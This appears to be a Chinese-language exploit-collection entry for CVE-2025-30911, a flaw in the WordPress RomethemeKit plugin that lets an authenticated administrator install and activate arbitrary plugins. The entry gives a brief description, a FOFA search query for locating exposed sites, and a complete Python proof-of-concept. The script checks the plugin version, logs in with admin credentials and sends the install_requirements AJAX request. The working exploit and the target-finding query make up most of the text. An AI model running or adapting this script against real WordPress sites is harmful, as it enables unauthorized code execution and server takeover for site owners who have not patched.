## WordPress RomethemeKit Plugin存在RCE漏洞(CVE-2025-30911)

## 漏洞描述
该漏洞允许经过身份验证的攻击者（具有管理员权限）以编程方式安装和激活任何插件（包括潜在的恶意插件），这可能导致在服务器上完全执行代码。

## fofa
```
"/wp-content/plugins/RomethemeKit"
```
## poc
```javascript
import requests
import argparse
import time
import re

#By Nxploited | Khaled Alenazi,

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()


def check_vulnerable_version(base_url):
    readme_url = f"{base_url}/wp-content/plugins/rometheme-for-elementor/readme.txt"
    try:
        response = requests.get(readme_url, verify=False, timeout=10)
        if response.status_code == 200:
            match = re.search(r"Stable tag:\s*([\d.]+)", response.text)
            if match:
                version = match.group(1)
                if version <= "1.5.4":
                    print("[+] Vulnerable version detected (<= 1.5.4). Proceeding with exploitation...")
                    time.sleep(3)
                    return True
                else:
                    print("[-] Plugin version is patched or not vulnerable.")
            else:
                print("[-] Unable to determine plugin version from readme.txt.")
        else:
            print("[-] readme.txt not found. Plugin may not be installed.")
    except Exception as e:
        print(f"[-] Error checking plugin version: {e}")
    return False


def login(session, url, username, password):
    login_url = f"{url}/wp-login.php"
    login_data = {
        "log": username,
        "pwd": password,
        "rememberme": "forever",
        "wp-submit": "Log In"
    }
    headers = {"User-Agent": get_user_agent()}
    response = session.post(login_url, data=login_data, headers=headers)
    if any("wordpress_logged_in" in c.name for c in session.cookies):
        print("[+] Logged in successfully.")
        return True
    else:
        print("[-] Login failed.")
        return False


def exploit_plugin_install(session, url, plugin):
    ajax_url = f"{url}/wp-admin/admin-ajax.php"
    payload = {
        "action": "install_requirements",
        "plugin": plugin
    }
    headers = {"User-Agent": get_user_agent()}
    print(f"[*] Sending exploit to install and activate plugin: {plugin}")
    response = session.post(ajax_url, data=payload, headers=headers)
    print("[+] Server response:")
    print(response.text)


def get_user_agent():
    return "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"


def main():
    parser = argparse.ArgumentParser(description="Exploit For CVE-2025-30911 | By Nxploited Khaled Alenazi")
    parser.add_argument("-u", "--url", required=True, help="Base URL of the WordPress site")
    parser.add_argument("-un", "--username", required=True, help="WordPress admin username")
    parser.add_argument("-p", "--password", required=True, help="WordPress admin password")
    parser.add_argument("-pl", "--plugin", default="hello-dolly/hello.php", help="Plugin to install (default: hello-dolly/hello.php)")
    args = parser.parse_args()

    session = requests.Session()
    session.verify = False

    print("[*] Checking plugin version...")
    if check_vulnerable_version(args.url):
        if login(session, args.url, args.username, args.password):
            exploit_plugin_install(session, args.url, args.plugin)
    else:
        print("[-] Target does not appear to be vulnerable or plugin is not present.")


if __name__ == "__main__":
    main()
```

## 漏洞来源
- https://github.com/Nxploited/CVE-2025-30911
